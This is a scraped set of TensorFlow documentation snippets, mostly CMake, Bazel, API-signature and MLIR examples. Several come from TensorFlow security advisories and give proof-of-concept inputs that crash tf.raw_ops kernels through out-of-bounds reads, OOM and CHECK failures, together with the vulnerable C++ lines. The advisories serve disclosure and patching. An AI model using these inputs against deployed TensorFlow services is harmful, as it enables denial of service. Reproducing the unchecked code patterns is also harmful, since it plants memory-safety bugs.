DESCRIPTION: This C++ snippet shows the vulnerable logic in TFLite's `ResolveAxis` function used to convert negative axis indices to positive ones. While it calculates a potential positive index, the critical validity check (`TFLITE_DCHECK`) is only active in debug builds, allowing invalid indices in release builds.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-009.md#_snippet_0

LANGUAGE: C++
CODE:
```
    // Handle negative index. A positive index 'p_idx' can be represented as a
    // negative index 'n_idx' as: n_idx = p_idx-num_dims
    // eg: For num_dims=3, [0, 1, 2] is the same as [-3, -2, -1]  */
    int current = axis[idx] < 0 ? (axis[idx] + num_dims) : axis[idx];
    TFLITE_DCHECK(current >= 0 && current < num_dims);
```

----------------------------------------

TITLE: Triggering OOM with StringNGrams in TensorFlow Python
DESCRIPTION: This Python snippet demonstrates how to trigger an Out-of-Memory (OOM) condition in vulnerable versions of TensorFlow using the `tf.raw_ops.StringNGrams` operation. The vulnerability is exploited by providing a negative value for `pad_width` (`-5`), which leads to an integer overflow and incorrect memory allocation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-009.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.StringNGrams(
  data=['123456'],
  data_splits=[0,1],
  separator='a'*15,
  ngram_widths=[],
  left_pad='',
  right_pad='',
  pad_width=-5,
  preserve_short_sequences=True)
```

----------------------------------------

TITLE: Demonstrating QuantizeV2 Vulnerability with Negative Axis - Python
DESCRIPTION: This Python snippet demonstrates a heap out-of-bounds read vulnerability in `tf.raw_ops.QuantizeV2` by providing an invalid negative value for the `axis` parameter. It calls the operation within a `tf.function` with a fixed input tensor and specific parameters, including `axis=-100`, which triggers the insecure memory access in older TensorFlow versions. Requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-184.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

@tf.function
def test():
  data=tf.raw_ops.QuantizeV2(
    input=[1.0,1.0],
    min_range=[1.0,10.0],
    max_range=[1.0,10.0],
    T=tf.qint32,
    mode='MIN_COMBINED',
    round_mode='HALF_TO_EVEN',
    narrow_range=False,
    axis=-100,
    ensure_minimum_range=10)
  return data

test()
```

----------------------------------------

TITLE: Vulnerable RaggedTensorToTensor loop (C++)
DESCRIPTION: This C++ snippet shows the vulnerable loop in the `RaggedTensorToTensor` kernel implementation (`tensorflow/core/kernels/ragged_tensor_to_tensor_op.cc`). It iterates using index `i` and accesses arrays (`row_split`, `parent_output_index`) in parallel. The vulnerability arises because `parent_output_index` can be shorter than `row_split`, leading to an out-of-bounds read when accessed with index `i`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-048.md#_snippet_1

LANGUAGE: cpp
CODE:
```
for (INDEX_TYPE i = 0; i < row_split_size - 1; ++i) {
  INDEX_TYPE row_length = row_split(i + 1) - row_split(i);
  INDEX_TYPE real_length = std::min(output_size, row_length);
  INDEX_TYPE parent_output_index_current = parent_output_index[i];
  ...
}
```

----------------------------------------

TITLE: Vulnerable Filesystem Match Check C++
DESCRIPTION: This C++ snippet shows the comparison within the parallel `GetMatchingPaths` function where the vulnerable out-of-bounds read occurs. The `dir_index` variable is incremented unconditionally outside the lambda function, potentially causing access beyond the allocated bounds of the `dirs` array during a filesystem pattern match check using the `fs->Match` method.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-032.md#_snippet_0

LANGUAGE: C++
CODE:
```
if (!fs->Match(child_path, dirs[dir_index])) { ... }
```

----------------------------------------

TITLE: TensorFlow C API: Assigning DLPack Tensor Data and Type C++
DESCRIPTION: This C++ snippet shows assignments of a DLPack tensor's data pointer and data type based on calls to TensorFlow C API functions `TFE_TensorHandleDevicePointer` and `GetDlDataType`. The vulnerability exists because the `status` variable passed to these functions is not checked immediately after, allowing execution to continue even if an error occurred, potentially leading to subsequent null pointer issues.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-025.md#_snippet_0

LANGUAGE: C++
CODE:
```
dlm_tensor->dl_tensor.data = TFE_TensorHandleDevicePointer(h, status);
  dlm_tensor->dl_tensor.dtype = GetDlDataType(data_type, status);
```

----------------------------------------

TITLE: Vulnerable Write Operation in TensorFlow Dilation2DBackpropInput (C++)
DESCRIPTION: This C++ snippet shows the specific line of code within the TensorFlow `Dilation2DBackpropInput` kernel implementation where the heap out-of-bounds write vulnerability occurs. The write operation to `in_backprop` uses indices (`h_in_max`, `w_in_max`) that are not adequately validated against the bounds of the `in_backprop` buffer, unlike `h_out` and `w_out` which are loop-bounded.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-054.md#_snippet_1

LANGUAGE: c++
CODE:
```
in_backprop(b, h_in_max, w_in_max, d) += out_backprop(b, h_out, w_out, d);
```

----------------------------------------

TITLE: Run Bazel Target for Requirements Update (Shell)
DESCRIPTION: Executes a specific Bazel target within the TensorFlow repository to automate the process of updating project dependency requirements. Requires the Bazel build system to be installed and configured in the project environment. The target `//ci/official/requirements_updater:requirements.update` is responsible for invoking the requirements compilation process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/requirements_lock_3_11.txt#_snippet_0

LANGUAGE: Shell
CODE:
```
bazel run //ci/official/requirements_updater:requirements.update
```

----------------------------------------

TITLE: Initializing FeaturePropertiesT Class in Python
DESCRIPTION: Initializes a new instance of the `FeaturePropertiesT` class. This is the default constructor for creating an empty object before populating its properties.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/FeaturePropertiesT.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.FeaturePropertiesT()
```

----------------------------------------

TITLE: Initializing InputTextTensorMd Python Class
DESCRIPTION: This snippet shows the constructor signature for the `InputTextTensorMd` class. It allows creating an instance with optional name, description, and tokenizer metadata. The `tokenizer_md` parameter accepts information about the tokenizer used for the text tensor, currently supporting `RegexTokenizerMd`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/metadata_info/InputTextTensorMd.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_writers.metadata_info.InputTextTensorMd(
    name: Optional[str] = None,
    description: Optional[str] = None,
    tokenizer_md: Optional[tflite_support.metadata_writers.metadata_info.RegexTokenizerMd] = None
)
```

----------------------------------------

TITLE: Demonstrating SparseCountSparseOutput Segfault - Python
DESCRIPTION: This Python code snippet demonstrates how to trigger the segmentation fault vulnerability in `tf.raw_ops.SparseCountSparseOutput` by providing a 'dense_shape' tensor with negative values. It initializes empty input tensors and calls the operation with invalid shape data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-009.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

indices = tf.constant([], shape=[0, 0], dtype=tf.int64)
values = tf.constant([], shape=[0, 0], dtype=tf.int64)
dense_shape = tf.constant([-100, -100, -100], shape=[3], dtype=tf.int64)
weights = tf.constant([], shape=[0, 0], dtype=tf.int64)

tf.raw_ops.SparseCountSparseOutput(indices=indices, values=values, dense_shape=dense_shape, weights=weights, minlength=79, maxlength=96, binary_output=False)
```

----------------------------------------

TITLE: Defining MLIR Library - HloToLinalgUtils - CMake
DESCRIPTION: Defines a CMake target for the `HloToLinalgUtils` MLIR library, primarily used for legalizing HLO operations to the Linalg dialect. It uses `legalize_to_linalg_utils.cc`, depends on generated code targets, links the MLIR `Core` component, and links publicly against various MLIR dialects, passes, and utilities required for legalization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/mhlo/utils/CMakeLists.txt#_snippet_3

LANGUAGE: CMake
CODE:
```
add_mlir_library(HloToLinalgUtils
  legalize_to_linalg_utils.cc

  DEPENDS
  MLIRhlo_opsIncGen
  MLIRMhloPassIncGen

  LINK_COMPONENTS
  Core

  LINK_LIBS PUBLIC
  MhloDialect
  MhloTypeConversion
  MLIRBufferizationDialect
  MLIRComplexDialect
  MLIRIR
  MLIRLinalgUtils
  MLIRPass
  MLIRRewrite
  MLIRTransformUtils
)
```

----------------------------------------

TITLE: Building MLIR MhloToMemrefConversion Library (CMake)
DESCRIPTION: Defines a CMake target for the MhloToMemrefConversion library. This library contains MLIR passes and patterns for converting MHLO dialect operations into the MemRef dialect, specifying the source file and dependencies.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/mhlo/transforms/CMakeLists.txt#_snippet_8

LANGUAGE: CMake
CODE:
```
add_mlir_library(MhloToMemrefConversion
  hlo_legalize_to_memref/hlo_legalize_to_memref.cc

  DEPENDS
  MLIRhlo_opsIncGen
  MLIRMhloPassIncGen

  LINK_COMPONENTS
  Core

  LINK_LIBS PUBLIC
  MhloDialect
  MhloTypeConversion
  MLIRIR
  MLIRPass
  MLIRMathDialect
  MLIRTransforms
  MLIRTransformUtils
)
```

----------------------------------------

TITLE: Excluding XNNPACK Delegate Source CMake
DESCRIPTION: Removes the `tflite_with_xnnpack.cc` source file from the `TFLITE_SRCS` list using a regular expression. This exclusion is done because a more explicit method for enabling the XNNPACK delegate is preferred over the weak-symbol approach used in this file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/CMakeLists.txt#_snippet_23

LANGUAGE: CMake
CODE:
```
# This particular file is excluded because the more explicit approach to enable
# XNNPACK delegate is preferred to the weak-symbol one.
list(FILTER TFLITE_SRCS EXCLUDE REGEX ".*tflite_with_xnnpack\\.cc$")
```

----------------------------------------

TITLE: Build MLIR HLO Python Modules
DESCRIPTION: This command orchestrates the final build process for the MLIR HLO Python packages/modules. It sets the root prefix and installation prefix for the resulting files, includes all necessary declared source groups, and links against the previously built common CAPI library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/bindings/python/CMakeLists.txt#_snippet_7

LANGUAGE: CMake
CODE:
```
add_mlir_python_modules(MLIRHLOPythonModules
  ROOT_PREFIX "${MLIR_HLO_BINARY_DIR}/python_packages/mlir_hlo/mlir"
  INSTALL_PREFIX "python_packages/mlir_hlo/mlir"
  DECLARED_SOURCES
    MLIRPythonSources
    MLIRPythonExtension.RegisterEverything
    MLIRHLOPythonSources
    MLIRHLOPythonExtensions
  COMMON_CAPI_LINK_LIBS
    MLIRHLOCAPI
  )
```

----------------------------------------

TITLE: Adding Subdirectory in CMake
DESCRIPTION: This CMake command adds the specified subdirectory to the current build. CMake will then process the `CMakeLists.txt` file located in `mlir-hlo-opt`, incorporating its targets and build definitions into the main project. This is typically used to include modules or components located in separate directories.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/tools/CMakeLists.txt#_snippet_0

LANGUAGE: CMake
CODE:
```
add_subdirectory(mlir-hlo-opt)
```

----------------------------------------

TITLE: Packing Object into FlatBuffers Buffer Python
DESCRIPTION: This method serializes the current `SentencePieceTokenizerOptionsT` instance into a FlatBuffers buffer using the provided builder object. It appends the object's data to the builder and returns the offset of the created object within the buffer. This offset is then typically used by the builder to complete the buffer construction.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SentencePieceTokenizerOptionsT.md#_snippet_4

LANGUAGE: python
CODE:
```
Pack(
    builder
)
```

----------------------------------------

TITLE: Accessing TFLite Quantization Params via Reinterpret Cast (C++)
DESCRIPTION: This C++ code snippet from a TFLite kernel demonstrates the problematic pattern identified in TFSA-2021-156. It accesses `filter->quantization.params` by `reinterpret_cast`ing it to `TfLiteAffineQuantization*` without checking if `filter->quantization.type` is `kTfLiteNoQuantization`. This missing check allows the use of uninitialized memory if the tensor is not quantized.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-156.md#_snippet_0

LANGUAGE: C++
CODE:
```
    const auto* affine_quantization =
        reinterpret_cast<TfLiteAffineQuantization*>(
            filter->quantization.params);
```

----------------------------------------

TITLE: Listing Parameter Converter APIs (C++)
DESCRIPTION: This snippet lists C++ symbols involved in converting parameters for the Python API, exposed by the `//tensorflow/python:python_api_parameter_converter` build target. It includes functions for converting parameters and copying tensor lists.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/def_file_filter/symbols_pybind.txt#_snippet_1

LANGUAGE: C++
CODE:
```
tensorflow::ConvertPythonAPIParameters
```

LANGUAGE: C++
CODE:
```
tensorflow::CopyPythonAPITensorLists
```

----------------------------------------

TITLE: Include LLVM/MLIR CMake Modules and Directories
DESCRIPTION: Includes standard LLVM and MLIR CMake modules and adds necessary include directories and link directories to the project build settings. It also propagates LLVM-specific compiler definitions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/CMakeLists.txt#_snippet_11

LANGUAGE: CMake
CODE:
```
include(TableGen)
include(AddLLVM)
include(AddMLIR)
include(HandleLLVMOptions)
include_directories(${LLVM_INCLUDE_DIRS})
include_directories(${MLIR_INCLUDE_DIRS})
include_directories(${CMAKE_CURRENT_SOURCE_DIR})
include_directories(${CMAKE_CURRENT_BINARY_DIR})
link_directories(${LLVM_BUILD_LIBRARY_DIR})
add_definitions(${LLVM_DEFINITIONS})
```

----------------------------------------

TITLE: Building Text Model Class in TensorFlow
DESCRIPTION: Builds the class instance. This method is typically used for lazy initialization of the model specification or related components.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/question_answer/BertQaSpec.md#_snippet_1

LANGUAGE: python
CODE:
```
build()

```

----------------------------------------

TITLE: Defining NormalizationOptionsStartStdVector Function in Python
DESCRIPTION: This snippet shows the function signature for `NormalizationOptionsStartStdVector`. It's a utility function likely used during the FlatBuffers schema generation process to properly initialize a vector field for standard deviations within the NormalizationOptions table. It requires a `builder` object (the FlatBuffers builder) and `numElems` (the number of elements the vector will contain).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/NormalizationOptionsStartStdVector.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.NormalizationOptionsStartStdVector(
    builder, numElems
)
```

----------------------------------------

TITLE: Updating Compile Flags for Executable (CMake)
DESCRIPTION: Applies standard LLVM-specific compiler flags and configurations to the `mlir-hlo-opt` executable target. This step integrates the target into the standard LLVM build system practices, ensuring consistent compilation options.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/tools/mlir-hlo-opt/CMakeLists.txt#_snippet_3

LANGUAGE: CMake
CODE:
```
llvm_update_compile_flags(mlir-hlo-opt)
```

----------------------------------------

TITLE: Build OVIC Validator Binary - Bazel Shell
DESCRIPTION: Builds the `ovic_validator` binary using Bazel. This tool is used to verify if a TFLite model file adheres to the expected format requirements for the competition. The `--cxxopt=-Wno-all` option suppresses all C++ compiler warnings during the build.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/java/ovic/README.md#_snippet_4

LANGUAGE: sh
CODE:
```
bazel build //tensorflow/lite/java/ovic:ovic_validator --cxxopt=-Wno-all
```

----------------------------------------

TITLE: Defining Complex OpTypePattern C++
DESCRIPTION: Shows a more complex `OpTypePattern` definition in C++ using nested initializer lists to match a specific subgraph. This pattern identifies a QuantizeV2 operation where the second and third inputs depend on nested Min/Max operations that ultimately connect to Dequantize nodes, useful for finding redundant operations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/graph_transforms/README.md#_snippet_13

LANGUAGE: C++
CODE:
```
{"QuantizeV2",
  {
    {"Dequantize"},
    {"Min",
      {
        {"Reshape",
          {
            {"Dequantize"},
            {"Const"},
          }
        },
        {"Const"},
      }
    },
    {"Max",
      {
        {"Reshape",
          {
            {"Dequantize"},
            {"Const"},
          }
        },
        {"Const"},
      }
    },
  }
}
```

----------------------------------------

TITLE: Run OVIC Classifier Test - Bazel Shell
DESCRIPTION: Executes the Bazel test for the OvicClassifierTest target within the TensorFlow Lite OVIC Java module. The `--cxxopt=-Wno-all` option suppresses all C++ compiler warnings, and `--test_output=all` prints the full test output.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/java/ovic/README.md#_snippet_2

LANGUAGE: sh
CODE:
```
bazel test //tensorflow/lite/java/ovic:OvicClassifierTest --cxxopt=-Wno-all --test_output=all
```

----------------------------------------

TITLE: Including Packaging Dependency
DESCRIPTION: The `packaging` library is listed without a version bound. Although often vendored within setuptools, it's included explicitly here to ensure it's available in CI environments.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/ci_build/release/requirements_common.txt#_snippet_5

LANGUAGE: Python
CODE:
```
packaging
```

----------------------------------------

TITLE: Check Buffer Identifier for NormalizationOptions Python
DESCRIPTION: This class method checks if a given buffer, potentially starting at an offset and with size prefixing, contains the correct identifier string ('NORM') for the `NormalizationOptions` schema. This validates the buffer content.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/NormalizationOptions.md#_snippet_7

LANGUAGE: Python
CODE:
```
@classmethod
NormalizationOptionsBufferHasIdentifier(
    buf, offset, size_prefixed=False
)
```

----------------------------------------

TITLE: Defining Traced Save Function (__inference__traced_save_45) - TensorFlow GraphDef
DESCRIPTION: This function definition outlines the steps for saving a variable. It includes operations like checking if the file prefix is an S3 path, selecting a temporary directory path, joining paths, disabling copy-on-read for the variable, and reading the variable's value before the save operation occurs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tf2xla/api/v2/testdata/graph_with_flib_def.txt#_snippet_8

LANGUAGE: TensorFlow GraphDef
CODE:
```
library {
  function {
    signature {
      name: "__inference__traced_save_45"
      input_arg {
        name: "file_prefix"
        type: DT_STRING
      }
      input_arg {
        name: "read_disablecopyonread_variable"
        type: DT_RESOURCE
        handle_data {
          dtype: DT_FLOAT
          shape {
          }
        }
      }
      input_arg {
        name: "savev2_const"
        type: DT_STRING
      }
      output_arg {
        name: "identity_3"
        type: DT_STRING
      }
      is_stateful: true
      control_output: "MergeV2Checkpoints"
      control_output: "Read/DisableCopyOnRead"
      control_output: "Read/ReadVariableOp"
    }
    node_def {
      name: "StaticRegexFullMatch"
      op: "StaticRegexFullMatch"
      input: "file_prefix"
      device: "/device:CPU:*"
      attr {
        key: "_output_shapes"
        value {
          list {
            shape {
            }
          }
        }
      }
      attr {
        key: "pattern"
        value {
          s: "^s3://.*"
        }
      }
    }
    node_def {
      name: "Const"
      op: "Const"
      device: "/device:CPU:*"
      attr {
        key: "_output_shapes"
        value {
          list {
            shape {
            }
          }
        }
      }
      attr {
        key: "dtype"
        value {
          type: DT_STRING
        }
      }
      attr {
        key: "value"
        value {
          tensor {
            dtype: DT_STRING
            tensor_shape {
            }
            string_val: ".part"
          }
        }
      }
    }
    node_def {
      name: "Const_1"
      op: "Const"
      device: "/device:CPU:*"
      attr {
        key: "_output_shapes"
        value {
          list {
            shape {
            }
          }
        }
      }
      attr {
        key: "dtype"
        value {
          type: DT_STRING
        }
      }
      attr {
        key: "value"
        value {
          tensor {
            dtype: DT_STRING
            tensor_shape {
            }
            string_val: "_temp/part"
          }
        }
      }
    }
    node_def {
      name: "Select"
      op: "Select"
      input: "StaticRegexFullMatch:output:0"
      input: "Const:output:0"
      input: "Const_1:output:0"
      device: "/device:CPU:*"
      attr {
        key: "T"
        value {
          type: DT_STRING
        }
      }
      attr {
        key: "_output_shapes"
        value {
          list {
            shape {
            }
          }
        }
      }
    }
    node_def {
      name: "StringJoin"
      op: "StringJoin"
      input: "file_prefix"
      input: "Select:output:0"
      device: "/device:CPU:*"
      attr {
        key: "N"
        value {
          i: 2
        }
      }
      attr {
        key: "_output_shapes"
        value {
          list {
            shape {
            }
          }
        }
      }
    }
    node_def {
      name: "Read/DisableCopyOnRead"
      op: "DisableCopyOnRead"
      input: "read_disablecopyonread_variable"
      attr {
        key: "_output_shapes"
        value {
          list {
          }
        }
      }
    }
    node_def {
      name: "Read/ReadVariableOp"
      op: "ReadVariableOp"
      input: "read_disablecopyonread_variable"
      input: "^Read/DisableCopyOnRead"
      attr {
        key: "_output_shapes"
        value {
          list {
            shape {
            }
          }
        }
      }
      attr {
        key: "dtype"
        value {
          type: DT_FLOAT
        }
      }
    }
    node_def {
      name: "Identity"
      op: "Identity"
      input: "Read/ReadVariableOp:value:0"
      attr {
        key: "T"

```

----------------------------------------

TITLE: Demonstrating MaxPool ksize Vulnerability in TensorFlow Python
DESCRIPTION: This Python snippet demonstrates how to trigger a denial-of-service vulnerability in TensorFlow's `MaxPool` GPU kernel. It uses `tf.raw_ops.MaxPool` with specific inputs where the `ksize` dimensions are larger than the input dimensions, causing a `CHECK` failure on affected versions when run on GPU.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-120.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
import numpy as np

input = np.ones([1, 1, 1, 1])
ksize = [1, 1, 2, 2]
strides = [1, 1, 1, 1]
padding = 'VALID'
data_format = 'NCHW'

tf.raw_ops.MaxPool(input=input, ksize=ksize, strides=strides, padding=padding, data_format=data_format)
```

----------------------------------------

TITLE: Triggering CHECK-Fail in tf.raw_ops.FractionalMaxPoolGrad (Python)
DESCRIPTION: This Python snippet shows how to trigger a denial of service in `tf.raw_ops.FractionalMaxPoolGrad` by providing inputs with incompatible ranks. The operation fails a CHECK condition due to the lack of rank validation between input and output tensors, causing the process to abort in vulnerable TensorFlow versions. Requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-066.md#_snippet_1

LANGUAGE: python
CODE:
```
import tensorflow as tf

orig_input = tf.constant([1], shape=[1], dtype=tf.int64)
orig_output = tf.constant([1], shape=[1], dtype=tf.int64)
out_backprop = tf.constant([1, 1], shape=[2, 1, 1, 1], dtype=tf.int64)
row_pooling_sequence = tf.constant([1], shape=[1], dtype=tf.int64)
col_pooling_sequence = tf.constant([1], shape=[1], dtype=tf.int64)

tf.raw_ops.FractionalMaxPoolGrad(
  orig_input=orig_input, orig_output=orig_output, out_backprop=out_backprop,
  row_pooling_sequence=row_pooling_sequence,
  col_pooling_sequence=col_pooling_sequence, overlapping=False)
```

----------------------------------------

TITLE: Triggering TensorFlow Dequantize Heap OOB Read - Python
DESCRIPTION: This Python snippet demonstrates how to trigger a heap out-of-bounds read vulnerability in `tf.raw_ops.Dequantize`. It crafts input tensors (`input_tensor`, `min_range`, `max_range`) such that `min_range` and `max_range` have incompatible shapes when used with the 'axis' parameter, exploiting the lack of validation in the operation's C++ implementation. This requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-070.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

input_tensor=tf.constant(
    [75, 75, 75, 75, -6, -9, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10,\
  -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10,\
  -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10,\
  -10, -10, -10, -10], shape=[5, 10], dtype=tf.int32)
input_tensor=tf.cast(input_tensor, dtype=tf.quint8)
min_range = tf.constant([-10], shape=[1], dtype=tf.float32)
max_range = tf.constant([24, 758, 758, 758, 758], shape=[5], dtype=tf.float32)

tf.raw_ops.Dequantize(
    input=input_tensor,
    min_range=min_range,
    max_range=max_range,
    mode='SCALED',
    narrow_range=True,
    axis=0,
    dtype=tf.dtypes.float32)
```

----------------------------------------

TITLE: Demonstrating Vulnerability Triggering with tf.raw_ops.DrawBoundingBoxesV2 (Python)
DESCRIPTION: This Python code snippet demonstrates how to trigger the memory corruption vulnerability in `tf.raw_ops.DrawBoundingBoxesV2`. It creates specially crafted tensors (`images`, `boxes`, `colors`) with dimensions that violate the expected input shape for `boxes` (specifically, the last dimension of `boxes` is 0 instead of 4), leading to out-of-bounds memory access when the operation is executed. Running this code on an unpatched TensorFlow version will likely cause a crash or undefined behavior.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-059.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

images = tf.fill([10, 96, 0, 1], 0.)
boxes = tf.fill([10, 53, 0], 0.)
colors = tf.fill([0, 1], 0.)

tf.raw_ops.DrawBoundingBoxesV2(images=images, boxes=boxes, colors=colors)
```

----------------------------------------

TITLE: Configuring C++ Library with Bazel - Bazel
DESCRIPTION: Demonstrates the Bazel `cc_library` rule used to define a C++ library for a specific StableHLO operation. It specifies source files, header files, and dependencies for the library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/experimental/shlo/README.md#_snippet_4

LANGUAGE: Bazel
CODE:
```
cc_library(
  name = "op_name",
  srcs = [ "op_name.cc" ],
  hdrs = [ "op_name.h" ],
  deps = [
    # ...
  ]
)
```

----------------------------------------

TITLE: Lowering tf.SpaceToBatchND to TOSA MLIR
DESCRIPTION: Documents the lowering of the TensorFlow `tf.SpaceToBatchND` operation, which rearranges data from batches into spatial blocks, to the TOSA dialect's `lower_space_to_batch_nd_op`. This operator takes input, block shape, and paddings.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_34

LANGUAGE: MLIR
CODE:
```
%output = tf.SpaceToBatchND(%input, %block_shape, %paddings)
```

LANGUAGE: MLIR
CODE:
```
%output = lower_space_to_batch_nd_op(%input, %block_shape, %paddings)
```

----------------------------------------

TITLE: Registering HLO Ops TableGen Target
DESCRIPTION: This command registers the target responsible for generating HLO operation-related includes (`MLIRhlo_opsIncGen`) as a public TableGen target and ensures required MLIR headers are built before this target.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/mhlo/IR/CMakeLists.txt#_snippet_1

LANGUAGE: cmake
CODE:
```
add_public_tablegen_target(MLIRhlo_opsIncGen)
add_dependencies(mlir-headers MLIRhlo_opsIncGen)
```

----------------------------------------

TITLE: Defining and Registering Reduction Strategy (C++)
DESCRIPTION: Illustrates how to implement a custom reduction strategy for `mlir-bisect` in C++. The strategy function takes a `BisectState` and an operation, generates multiple candidate modules by cloning and modifying the original, and returns them. The `REGISTER_MLIR_REDUCE_STRATEGY` macro registers the function with the bisect tool.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir/tools/mlir_bisect/README.md#_snippet_3

LANGUAGE: c++
CODE:
```
SmallVector<OwningOpRef<ModuleOp>>
FrobulateAndDefenestrate(BisectState&, dialect::SomeOp some_op) {
  auto [cloned_module_1, cloned_op_1] = CloneModuleFor(some_op);
  Frobulate(cloned_op_1);

  auto [cloned_module_2, cloned_op_2] = CloneModuleFor(some_op);
  Defenestrate(cloned_op_2);

  return {cloned_module_1, cloned_module_2};
}

REGISTER_MLIR_REDUCE_STRATEGY(FrobulateAndDefenestrate);
```

----------------------------------------

TITLE: Define MhloAnalysis MLIR Library - TensorFlow Build
DESCRIPTION: This snippet uses the `add_mlir_library` command to define a build target for an MLIR library named `MhloAnalysis`. It includes `shape_component_analysis.cc` as its source file, lists `mlir-headers` as a build dependency, and specifies that it publicly links against `MLIRAnalysis` and `MLIRIR` libraries.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/stablehlo_ext/analysis/CMakeLists.txt#_snippet_0

LANGUAGE: TensorFlow Build
CODE:
```
add_mlir_library(MhloAnalysis
shape_component_analysis.cc

DEPENDS
mlir-headers

LINK_LIBS PUBLIC
MLIRAnalysis
MLIRIR
)
```

----------------------------------------

TITLE: Include MLIR Python CMake Module
DESCRIPTION: This command includes the standard CMake module provided by the MLIR project for handling Python bindings. It provides core functions and variables needed for building MLIR Python components.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/bindings/python/CMakeLists.txt#_snippet_0

LANGUAGE: CMake
CODE:
```
include(AddMLIRPython)
```

----------------------------------------

TITLE: Replaying Before Optimization HLO in Single Process Bash
DESCRIPTION: This command runs the XLA multi-host HLO runner to replay a specific 'before optimizations' HLO graph file (`/tmp/dump/module_0023.pjit__wrapped_step_fn.before_optimizations.txt`) in a single process setup.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tools_multihost_hlo_runner.md#_snippet_5

LANGUAGE: bash
CODE:
```
bazel run //xla/tools/multihost_hlo_runner:hlo_runner_main -- \
  /tmp/dump/module_0023.pjit__wrapped_step_fn.before_optimizations.txt
```

----------------------------------------

TITLE: MLIR TPU Input Reordering Pass: After
DESCRIPTION: This MLIR snippet shows the IR structure after the `-tf-tpu-reorder-replicate-partitioned-inputs` pass. It demonstrates the transformation where `tf.TPUReplicatedInput` ops now feed into a single `tf.TPUPartitionedInput` op, which simplifies subsequent compilation passes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_58

LANGUAGE: MLIR
CODE:
```
!rtype = type tensor<!tf_type.resource<tensor<10x3xf32>>>
func @data_and_model_parallelism(%arg0: !rtype, %arg1: !rtype, %arg2: !rtype, %arg3: !rtype) -> !rtype {
